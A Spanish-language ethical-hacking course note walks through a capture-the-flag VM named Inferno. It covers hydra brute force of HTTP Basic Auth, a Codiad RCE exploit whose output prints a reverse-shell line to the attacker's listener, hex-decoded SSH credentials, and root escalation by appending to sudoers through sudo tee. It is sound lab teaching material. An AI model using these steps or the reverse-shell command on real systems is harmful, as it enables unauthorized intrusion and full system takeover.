---
title: "🖥️ Máquina: Inferno — Hacking Ético"
aliases:
  - Inferno
  - inferno
  - Máquina Inferno
  - VM Inferno
  - Writeup Inferno
tags:
  - ifct0109
  - hacking-etico
  - vms
  - vulnerabilidades-web
  - linux
  - ctf
---

# 🖥️ Máquina: Inferno

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Categoría:** Vulnerabilidades Web  
> **Técnicas trabajadas:** Fuerza bruta HTTP básica (hydra) · Codiad RCE (searchsploit) · Decodificación hexadecimal (CyberChef) · Escalada de privilegios (sudo + tee + sudoers)  
> **Descripción:** En esta práctica descubriremos un recurso web protegido por autenticación HTTP básica, aplicaremos fuerza bruta para obtener las credenciales, accederemos a un IDE Codiad vulnerable a RCE autenticado mediante un exploit de tres terminales, decodificaremos un archivo en hexadecimal para obtener credenciales SSH y escalaremos privilegios abusando del comando tee con sudo para añadir permisos al archivo sudoers.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.10`
* **`RHOST` (Víctima / Inferno):** Ej. `10.0.0.14`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina Inferno tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de servicios

```bash
nmap -A -p- 10.0.0.14
```

```text
22/tcp  open  ssh   OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
23/tcp  open  tcpwrapped
25/tcp  open  tcpwrapped
53/tcp  open  tcpwrapped
80/tcp  open  http  Apache httpd 2.4.38 ((Debian))
|_http-title: Dante's Inferno
```

> [!info] Resultado
> Varios puertos abiertos aunque la mayoría aparecen como tcpwrapped (no accesibles desde fuera). El puerto 80 muestra una web temática sobre la Divina Comedia de Dante. Enumeramos directorios:

---

## 🌐 Fase 2: Enumeración web y fuerza bruta HTTP

```bash
gobuster dir -r -u "http://10.0.0.14" -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

```text
/inferno  (Status: 401) [Size: 455]
```

> [!info] Resultado
> El directorio /inferno devuelve un 401 Unauthorized. Al acceder desde el navegador aparece un diálogo de autenticación HTTP básica (Basic Auth) de Apache que pide usuario y contraseña. Usamos hydra para hacer fuerza bruta sobre ese formulario GET:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.14 http-get /inferno/ -u -f
```

```text
[80][http-get] host: 10.0.0.14  login: admin  password: dante1
```

> [!info] Resultado
> Credenciales encontradas: admin:dante1. Accedemos desde el navegador incluyendo las credenciales en la URL:

```bash
http://admin:dante1@10.0.0.14/inferno
```

> [!info] Resultado
> Dentro hay un segundo formulario de login, esta vez un POST. Probamos las mismas credenciales y funcionan. Se trata de un Codiad, un IDE web de código abierto que permite editar y ejecutar código directamente desde el navegador.

---

## 💥 Fase 3: Explotación — Codiad RCE autenticado

```bash
searchsploit codiad
```

```text
Codiad 2.4.3 - Multiple Vulnerabilities                        | php/webapps/35585.txt
Codiad 2.5.3 - Local File Inclusion                            | php/webapps/36371.txt
Codiad 2.8.4 - Remote Code Execution (Authenticated)           | multiple/webapps/49705.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (2)       | multiple/webapps/49902.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (3)       | multiple/webapps/49907.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (4)       | multiple/webapps/50474.txt
```

> [!info] Resultado
> Hay varios RCE para Codiad 2.8.4. No conocemos la versión exacta instalada pero los probaremos. Descargamos el primero:

```bash
searchsploit -m 49705
```

```bash
python3 49705.py
```

```text
Usage :
        python 49705.py [URL] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]
Example :
        python 49705.py http://localhost/ admin admin 8.8.8.8 8888 linux
```

> [!info] Resultado
> El exploit requiere tres terminales activas simultáneamente. Antes de ejecutarlo preparamos el entorno: dividimos la terminal en tres terminales horizontales. El exploit instruye sobre qué ejecutar en cada uno:

En el terminal 1 lanzamos el exploit (pero aún no confirmamos con Y):

```bash
python3 49705.py http://admin:dante1@10.0.0.14/inferno/ admin dante1 10.0.0.10 9002 linux
```

```text
[+] Please execute the following command on your vps:
echo 'bash -c "bash -i >/dev/tcp/10.0.0.10/9003 0>&1 2>&1"' | nc -lnvp 9002
nc -lnvp 9003
[+] Please confirm that you have done the two command above [y/n]
[Y/n]
```

En el terminal 2 ejecutamos el primer comando que nos indica el exploit:

```bash

```

En el terminal 3 ponemos Kali en escucha en el puerto 9003:

```bash
nc -lnvp 9003
```

Volvemos al terminal 1 y confirmamos que todo está listo:

```bash
[Y/n] Y
```

```text
www-data@Inferno:/var/www/html/inferno/components/filemanager$
```

> [!info] Resultado
> Conexión recibida en el terminal 3. Estamos dentro como www-data. Verificamos:

```bash
id
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 🔍 Fase 4: Movimiento lateral — decodificación de credenciales

Exploramos el directorio home de dante en busca de archivos legibles:

```bash
cd /home/dante/Downloads
```

```bash
ls -la
```

```bash
cat .download.dat
```

```text
c2 ab 4f 72 20 73 65 e2 80 99 20 74 75 20 71 75 65 6c 20 56 69 72 67 69 6c 69 6f 20 65 20 71 75 65
6c 6c 61 20 66 6f 6e 74 65 0a 63 68 65 20 73 70 61 6e 64 69 20 64 69 20 70 61 72 6c 61 72 20 73 c3
ac 20 6c 61 72 67 6f 20 66 69 75 6d 65 3f c2 bb 2c 0a 72 69 73 70 75 6f 73 e2 80 99 69 6f 20 6c 75
69 20 63 6f 6e 20 76 65 72 67 6f 67 6e 6f 73 61 20 66 72 6f 6e 74 65 2e
...
64 61 6e 74 65 3a 56 31 72 67 31 6c 31 30 68 33 6c 70 6d 33 0a
```

> [!info] Resultado
> El archivo contiene datos en formato hexadecimal. Lo decodificamos en https://cyberchef.org añadiendo la receta From Hex. El resultado es un fragmento de la Divina Comedia y al final aparecen las credenciales:

```text
«Or se' tu quel Virgilio e quella fonte
che spandi di parlar sì largo fiume?»,
rispuos'io lui con vergognosa fronte.

«O de li altri poeti onore e lume,
vagliami 'l lungo studio e 'l grande amore
che m'ha fatto cercar lo tuo volume.

Tu se' lo mio maestro e 'l mio autore,
tu se' solo colui da cu' io tolsi
lo bello stilo che m'ha fatto onore.

Vedi la bestia per cu' io mi volsi;
aiutami da lei, famoso saggio,
ch'ella mi fa tremar le vene e i polsi».

dante:V1rg1l10h3lpm3
```

> [!info] Resultado
> En la última línea del texto aparecen las credenciales: dante:V1rg1l10h3lpm3. Cerramos todas las terminales del exploit y nos conectamos por SSH directamente.

---

## 🔑 Fase 5: Acceso SSH como dante

```bash
ssh dante@10.0.0.14
```

```text
dante@10.0.0.14's password: V1rg1l10h3lpm3
```

```bash
ls -la
```

```bash
cat local.txt
```

```text
77f6f3c544ec0811e2d1243e2e0d1835
```

> [!info] Resultado
> Flag de usuario obtenida: 77f6f3c544ec0811e2d1243e2e0d1835

---

## 🚀 Fase 6: Escalada de privilegios — sudo + tee + sudoers

```bash
sudo -l
```

```text
(root) NOPASSWD: /usr/bin/tee
```

> [!info] Resultado
> dante puede ejecutar tee como root sin contraseña. tee es un comando que lee la entrada estándar y la escribe simultáneamente en pantalla y en uno o más archivos. Con permisos de root sobre tee podemos añadir contenido a cualquier archivo del sistema, incluido /etc/sudoers.
> La estrategia es añadir al sudoers una línea que otorgue a dante permisos completos de sudo. Usamos la opción -a de tee para append (añadir al final) en lugar de sobreescribir:

```bash

```

```text
%dante ALL=(ALL:ALL) ALL
```

> [!info] Resultado
> Tee muestra en pantalla lo que acaba de escribir en el archivo, confirmando que la operación fue exitosa. Verificamos los nuevos permisos:

```bash
sudo -l
```

```text
(root) NOPASSWD: /usr/bin/tee
(ALL : ALL) ALL
```

> [!info] Resultado
> dante ahora tiene permisos completos de sudo. Nos convertimos en root:

```bash
sudo su
```

```text
[sudo] password for dante: V1rg1l10h3lpm3
```

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

```bash
cd /root
```

```bash
ls -la
```

```bash
cat proof.txt
```

```text
(        )  (          (        )     )   
 )\ )  ( /(  )\ )       )\ )  ( /(  ( /(   
(()/(  )\())(()/(  (   (()/(  )\()) )\())  
 /(_))((_)\  /(_)) )\   /(_))((_)\ ((_)\   
(_))   _((_)(_))_|((_) (_))   _((_)  ((_)  
|_ _| | \| || |_  | __|| _ \ | \| | / _ \  
 | |  | .` || __| | _| |   / | .` || (_) | 
|___| |_|\_||_|   |___||_|_\ |_|\_| \___/ 

Congrats!
You've rooted Inferno!
77f6f3c544ec0811e2d1243e2e0d1835
```

> [!info] Resultado
> Flag de root obtenida: 77f6f3c544ec0811e2d1243e2e0d1835

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
